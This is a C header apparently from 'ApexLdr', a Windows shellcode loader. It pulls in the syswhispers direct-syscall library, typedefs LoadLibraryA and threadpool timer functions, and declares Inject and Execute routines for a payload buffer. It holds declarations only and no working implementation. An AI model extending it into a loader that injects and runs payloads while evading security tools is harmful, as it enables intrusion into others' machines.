#ifndef APEXLDR_INJECT_H
#define APEXLDR_INJECT_H

#include <windows.h>
#include "syswhispers.h"
#include "common.h"

#define		PAGE_SIZE			4096
#define		SET_TO_MULTIPLE_OF_4096(X)	( ((X) + 4095) & (~4095) )
#define NtCurrentProcess() ((HANDLE)(LONG_PTR)-1)

#define PAYLOAD_EXEC_DELAY      0x0A

typedef HMODULE (WINAPI* fnLoadLibraryA)(IN LPCSTR lpLibFileName);
typedef PTP_TIMER (WINAPI* fnCreateThreadpoolTimer)(IN PTP_TIMER_CALLBACK pfnti, IN OUT OPTIONAL PVOID pv, IN OPTIONAL PTP_CALLBACK_ENVIRON pcbe);
typedef void (WINAPI* fnSetThreadpoolTimer)(IN OUT PTP_TIMER pti, IN OPTIONAL PFILETIME pftDueTime, IN DWORD msPeriod, IN DWORD msWindowLength);
typedef DWORD (WINAPI* fnWaitForSingleObject)(IN HANDLE hHandle, IN DWORD dwMilliseconds);

BOOL Inject(PBYTE pPayloadBuffer, SIZE_T sPayloadSize, PBYTE* pInjectedPayload);
VOID Execute(PVOID pInjectedPayload);


#endif //APEXLDR_INJECT_H
